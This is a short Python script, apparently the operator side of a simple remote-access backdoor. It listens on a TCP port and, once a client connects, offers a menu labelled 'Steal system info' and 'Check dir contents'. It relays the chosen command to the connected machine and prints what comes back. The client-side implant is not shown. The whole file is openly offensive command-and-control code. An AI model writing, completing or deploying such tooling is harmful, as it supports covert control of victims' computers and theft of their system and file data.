from socket import *

SRV_ADDR = input("Enter servers address: ")
SRV_PORT = int(input("enter port num: "))

sock = socket(AF_INET,SOCK_STREAM)

sock.bind((SRV_ADDR, SRV_PORT))

sock.listen(1)

print("Awaiting retrieval...")

connection, address = sock.accept()

print("Client connected")

while True:
    
    action = input("""Choose what to do:
    1: Steal system info
    2: Check dir contents
    3: Close conenction
    """)
    
    connection.sendall(action.encode())

    data = connection.recv(1024)
    if not data: break
    print(data.decode("utf-8"))
    print("*"*40)
    
connection.close()
